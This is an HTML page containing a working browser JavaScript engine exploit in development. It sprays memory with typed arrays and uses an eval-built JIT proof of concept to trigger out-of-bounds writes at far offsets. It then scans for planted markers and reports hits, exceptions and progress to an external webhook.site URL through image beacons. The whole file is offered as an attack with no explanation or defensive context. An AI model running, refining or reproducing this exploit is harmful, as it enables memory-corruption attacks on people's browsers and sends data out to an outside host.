<html><body><script>
// esc7c: far-write marker-hunt v3. Window budget ~2.5s JS => 96 MiB spray (NO fill loop:
// backing stores are zero-initialized, we scan for tagged-Smi 0xA00/0x500 against zeros),
// 4 shots per window, 96 MiB step (matched to spray width), band +21.5..+24.5 GiB,
// cursor via ?s= (localStorage dies with device reboot). Beacon budget: 5/window.
const SINK = 'https://webhook.site/a5135ee0-e928-48f7-9ec2-81fd1a02be37';
function beacon(t, v){
  try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
}

var fake = new Uint32Array(10);
fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
var tahir = 1;
// --- 96 MiB spray, zero-init, no fill ---
const NBUF = 24, BLEN = 1 << 22;
var views = [];
for (var b = 0; b < NBUF; b++) views.push(new Uint32Array(new ArrayBuffer(BLEN)));

// --- canonical poc factory (literal C baked via eval; elision proven to survive this) ---
function mkpoc(C) {
  return eval('(function poc(a) {' +
    'var oob_array = new Array(5); oob_array[0] = 0x500;' +
    'let just_a_variable = fake[0];' +
    'let another_variable3 = fake[7];' +
    'if (a % 7 == 0) another_variable3 = ' + C + ';' +
    'another_variable3 = Math.max(another_variable3, tahir);' +
    'another_variable3 = another_variable3 >>> 0;' +
    'var index = fake[3];' +
    'var for_phi_modes = fake[6];' +
    'let c = fake[1];' +
    'for (var i = 0; i < 10; i++) {' +
      'if (a % 3 == 0) just_a_variable = c;' +
      'if (a % 37 == 0) just_a_variable = fake[2];' +
      'if (a % 11 == 0) just_a_variable = fake[8];' +
      'if (a % 17 == 0) just_a_variable = fake[5];' +
      'if (a % 19 == 0) just_a_variable = fake[4];' +
      'if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }' +
      'if (i >= 6) { for (let j = 0; j < 5; j++) { if (a % 5 == 0) { index = for_phi_modes; oob_array[index] = 0x500; } } }' +
      'for_phi_modes = c; c = just_a_variable;' +
    '}' +
    'return [index, BigInt(just_a_variable)];' +
  '})');
}
function warm(poc){
  for (var i = 2; i < 0x500; i++) poc(i);
  poc(7 * 5);
  for (var i = 0; i < 50000; i++) poc(i % 500 + 2);
}
var hitn = 0;
function scan(tag){
  for (var b = 0; b < NBUF; b++) {
    var u = views[b];
    for (var w = 0; w < u.length; w++) {
      var x = u[w];
      if (x === 0xA00 || x === 0x500) { if (hitn++ < 4) beacon('HIT-store','at='+tag+' buf='+b+' off='+(w*4)+' val=0x'+x.toString(16)); }
    }
  }
  if (hitn > 0) beacon('E7C-hits','at='+tag+' n='+hitn);
}
// band: +21.5 .. +24.5 GiB, step 96 MiB (32 shots total)
const STEP = 100663296;
var offs = [];
for (var o = 21.5 * 1073741824; o <= 24.5 * 1073741824; o += STEP) offs.push(o);
var cur = 0;
try { cur = Math.max(0, parseInt((location.search.match(/[?&]s=(-?\d+)/) || [])[1] || '0', 10)); } catch(e) {}
var start = cur;
const MAXSHOTS = 4;

function step(){
  if (cur >= offs.length || cur - start >= MAXSHOTS) { beacon('E7C-end','cur=' + cur); return; }
  var C = offs[cur];
  cur++;
  beacon('E7C-shot','i=' + (cur - 1));
  setTimeout(function(){
    try { var poc = mkpoc(C); warm(poc); poc(35); }
    catch (e) { beacon('E7C-exc', String(e).slice(0,80)); }
    setTimeout(function(){ scan('i' + (cur - 1)); setTimeout(step, 110); }, 90);
  }, 90);
}
setTimeout(step, 110);
</script></body></html>
